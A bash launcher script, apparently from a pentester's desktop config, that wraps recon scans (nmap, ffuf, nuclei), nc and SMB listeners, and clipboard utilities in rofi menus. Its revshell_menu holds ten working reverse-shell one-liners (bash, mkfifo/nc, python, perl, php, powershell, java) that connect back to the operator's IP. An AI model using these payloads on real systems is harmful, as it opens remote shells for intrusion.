#!/usr/bin/env bash
# rice :: AppSec hub (Super+O)
# Common application security tasks, one shortcut away.

DEPENDENCIES=(rofi xclip)
SCRIPT_NAME=${0##*/}
VERSION="1.0.0"

# shellcheck source=/dev/null
. "$HOME/.config/rice/bin/lib.sh"

function usage() {
    cat <<EOM

Security tools: engagements, targets, proxies, recon and evidence.
usage: ${SCRIPT_NAME} [--help|--version]

EOM
    exit 1
}

function main() {
    while (($#)); do
        case $1 in
        -h | --help) usage ;;
        --version)
            echo "${SCRIPT_NAME} ${VERSION}"
            exit 0
            ;;
        *)
            echo "Error: unknown option '$1'" >&2
            usage
            ;;
        esac
        shift
    done

    exit_on_missing_tools "${DEPENDENCIES[@]}"
    main_menu
}

function header() {
    printf '%s │ %s │ proxy %s │ vpn %s' \
        "$("$RICE_DIR/bin/engagement.sh" --name)" \
        "$(state_get target 'No target')" \
        "$("$RICE_DIR/bin/proxy.sh" --status)" \
        "$("$RICE_DIR/bin/vpn.sh" --status)"
}

function main_menu() {
    local choice
    choice=$(printf '󰯄  engagement\n󰗇  target\n󱂇  Proxy and browser\n󰖂  Lab VPN\n󰒋  Quick recon\n󰒍  Servers and listeners\n󰠮  utilities (encode, revshell, hash)\n󰆞  Evidence capture\n󰂚  notifications\n󰸌  theme\n󰸉  wallpaper\n' |
        rofi -dmenu -i -p "appsec" -mesg "$(header)" -theme "$ROFI_THEME" \
            -theme-str 'listview {columns: 1; lines: 11;} window {width: 34%;}')

    case "$choice" in
    *engagement*) "$RICE_DIR/bin/engagement.sh" --menu ;;
    *target*) "$RICE_DIR/bin/target.sh" --menu ;;
    *Proxy*) "$RICE_DIR/bin/proxy.sh" --menu ;;
    *VPN*) "$RICE_DIR/bin/vpn.sh" --menu ;;
    *recon*) recon_menu ;;
    *Servers*) server_menu ;;
    *utilities*) utils_menu ;;
    *capture*) "$RICE_DIR/bin/screenshot.sh" --menu ;;
    *notifications*) "$RICE_DIR/bin/notifications.sh" --list ;;
    *theme*) "$RICE_DIR/bin/theme.sh" --menu ;;
    *wallpaper*) "$RICE_DIR/bin/wallpaper.sh" --menu ;;
    esac
}

function require_target() {
    local target
    target=$(state_get target "")
    if [ -z "$target" ]; then
        notify "appsec" "Set a target first (Super+Shift+O)" dialog-warning critical
        exit 1
    fi
    printf '%s' "$target"
}

function scans_dir() {
    local path
    path=$(state_get engagement "$HOME")
    mkdir -p "$path/scans"
    printf '%s' "$path/scans"
}

function run_in_terminal() {
    local title="$1" command="$2"
    kitty --hold --title "$title" --directory "$(state_get engagement "$HOME")" \
        -e bash -lc "$command" &
    disown
}

function recon_menu() {
    local choice target out stamp
    target=$(require_target)
    out=$(scans_dir)
    stamp=$(date +%H%M)

    choice=$(printf '󰈲  nmap top-1000 + version\n󰈲  nmap full scan (-p-)\n󰌷  httpx (Technologies and titles)\n󰡦  subfinder (subdomains)\n󰍹  ffuf (directories, seclists)\n󰚧  nuclei (default templates)\n󰖟  whatweb\n󰑙  curl -I (security headers)\n' |
        rofi -dmenu -i -p "recon: $target" -theme "$ROFI_MENU_THEME" -lines 8)

    case "$choice" in
    *top-1000*) run_in_terminal "nmap" "nmap -Pn -sV --top-ports 1000 -oA '$out/nmap-top-$stamp' '$target'" ;;
    *"full scan"*) run_in_terminal "nmap -p-" "sudo nmap -Pn -sS -p- --min-rate 3000 -oA '$out/nmap-full-$stamp' '$target'" ;;
    *httpx*) run_in_terminal "httpx" "echo '$target' | httpx -td -title -sc -ip | tee '$out/httpx-$stamp.txt'" ;;
    *subfinder*) run_in_terminal "subfinder" "subfinder -d '$target' -silent | tee '$out/subs-$stamp.txt'" ;;
    *ffuf*) run_ffuf "$target" "$out" "$stamp" ;;
    *nuclei*) run_in_terminal "nuclei" "nuclei -u '$target' -o '$out/nuclei-$stamp.txt'" ;;
    *whatweb*) run_in_terminal "whatweb" "whatweb -a 3 '$target' | tee '$out/whatweb-$stamp.txt'" ;;
    *curl*) run_in_terminal "headers" "curl -sSIL '$target' | tee '$out/headers-$stamp.txt'" ;;
    esac
}

function run_ffuf() {
    local target="$1" out="$2" stamp="$3" wordlist url
    wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
    if [ ! -r "$wordlist" ]; then
        wordlist="/usr/share/wordlists/dirb/common.txt"
    fi

    url="$target"
    case "$url" in
    http://* | https://*) ;;
    *) url="http://$url" ;;
    esac

    run_in_terminal "ffuf" \
        "ffuf -u '${url%/}/FUZZ' -w '$wordlist' -mc all -fc 404 -o '$out/ffuf-$stamp.json'"
}

function server_menu() {
    local choice path port
    path=$(state_get engagement "$HOME")

    choice=$(printf '󰒋  http server (python, port 8000)\n󰒋  http server (custom port)\n󰐗  listener nc (4444)\n󰐗  listener nc (custom port)\n󰛳  smbserver (impacket, share RICE)\n' |
        rofi -dmenu -i -p "servers" -theme "$ROFI_MENU_THEME" -lines 5)

    case "$choice" in
    *"port 8000"*) run_in_terminal "http:8000" "cd '$path' && python -m http.server 8000" ;;
    *"http server (custom port)"*)
        port=$(rofi_input "port" "8000")
        [ -z "$port" ] && exit 0
        run_in_terminal "http:$port" "cd '$path' && python -m http.server $port"
        ;;
    *"nc (4444)"*) run_in_terminal "listener:4444" "rlwrap nc -lvnp 4444 || nc -lvnp 4444" ;;
    *"listener nc (custom port)"*)
        port=$(rofi_input "port" "4444")
        [ -z "$port" ] && exit 0
        run_in_terminal "listener:$port" "rlwrap nc -lvnp $port || nc -lvnp $port"
        ;;
    *smbserver*) run_in_terminal "smb" "impacket-smbserver -smb2support RICE '$path'" ;;
    esac
}

function utils_menu() {
    local choice
    choice=$(printf '󰯉  reverse shell (generate and copy)\n󰯉  base64 encode clipboard\n󰯉  base64 decode clipboard\n󰌷  url encode clipboard\n󰌷  url decode clipboard\n󰯄  hash clipboard (md5/sha1/sha256)\n󰖟  Open target in browser\n󰅍  Copy my tun0 IP\n' |
        rofi -dmenu -i -p "utilities" -theme "$ROFI_MENU_THEME" -lines 8)

    case "$choice" in
    *"reverse shell"*) revshell_menu ;;
    *"base64 encode"*) clip_transform "base64 -w0" "base64" ;;
    *"base64 decode"*) clip_transform "base64 -d" "base64 decoded" ;;
    *"url encode"*) clip_transform "jq -sRr @uri" "url encode" ;;
    *"url decode"*) clip_transform "python -c \"import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()),end='')\"" "url decode" ;;
    *hash*) hash_clipboard ;;
    *browser*) "$RICE_DIR/bin/target.sh" --set "$(state_get target '')" && xdg-open "$(state_get target '')" ;;
    *tun0*) copy_tun_ip ;;
    esac
}

function clip_transform() {
    local command="$1" label="$2" input output
    input=$(xclip -selection clipboard -o 2>/dev/null)
    if [ -z "$input" ]; then
        notify "utilities" "Empty clipboard" dialog-warning
        exit 1
    fi

    output=$(printf '%s' "$input" | eval "$command" 2>/dev/null)
    if [ -z "$output" ]; then
        notify "utilities" "$label failed" dialog-error critical
        exit 1
    fi

    printf '%s' "$output" | xclip -selection clipboard
    notify "$label" "${output:0:80}" edit-copy low
}

function hash_clipboard() {
    local input result
    input=$(xclip -selection clipboard -o 2>/dev/null)
    [ -z "$input" ] && exit 0

    result=$(printf 'md5:    %s\nsha1:   %s\nsha256: %s' \
        "$(printf '%s' "$input" | md5sum | cut -d' ' -f1)" \
        "$(printf '%s' "$input" | sha1sum | cut -d' ' -f1)" \
        "$(printf '%s' "$input" | sha256sum | cut -d' ' -f1)")

    printf '%s' "$result" | rofi -dmenu -i -p "hashes" -theme "$ROFI_MENU_THEME" -lines 3 |
        awk '{print $2}' | tr -d '\n' | xclip -selection clipboard
}

function lhost() {
    local ip
    ip=$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
    if [ -z "$ip" ]; then
        ip=$(ip -4 -o route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
    fi
    printf '%s' "$ip"
}

function copy_tun_ip() {
    local ip
    ip=$(lhost)
    if [ -z "$ip" ]; then
        notify "network" "No usable IP address" dialog-error critical
        exit 1
    fi
    printf '%s' "$ip" | xclip -selection clipboard
    notify "IP copied" "$ip" network-wired low
}

function revshell_menu() {
    local ip port choice payload
    ip=$(lhost)
    port=$(rofi_input "Listener port" "4444")
    [ -z "$port" ] && port=4444

    choice=$(printf 'bash tcp\nbash udp\nsh + mkfifo\npython3\nnc -e\nnc mkfifo\nperl\nphp\npowershell\njava runtime\n' |
        rofi -dmenu -i -p "revshell ($ip:$port)" -theme "$ROFI_MENU_THEME" -lines 10)
    [ -z "$choice" ] && exit 0

    case "$choice" in
    "bash tcp") payload="bash -i >& /dev/tcp/${ip}/${port} 0>&1" ;;
    "bash udp") payload="bash -i >& /dev/udp/${ip}/${port} 0>&1" ;;
    "sh + mkfifo") payload="rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port} >/tmp/f" ;;
    "python3") payload="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${ip}\",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'" ;;
    "nc -e") payload="nc -e /bin/bash ${ip} ${port}" ;;
    "nc mkfifo") payload="rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${port} >/tmp/f" ;;
    "perl") payload="perl -e 'use Socket;\$i=\"${ip}\";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
    "php") payload="php -r '\$sock=fsockopen(\"${ip}\",${port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
    "powershell") payload="powershell -nop -c \"\$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sby=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sby,0,\$sby.Length);\$s.Flush()};\$c.Close()\"" ;;
    "java runtime") payload="java -e 'Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"})'" ;;
    esac

    printf '%s' "$payload" | xclip -selection clipboard
    notify "Reverse shell copied" "$choice → ${ip}:${port}" utilities-terminal
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
    exit $?
fi
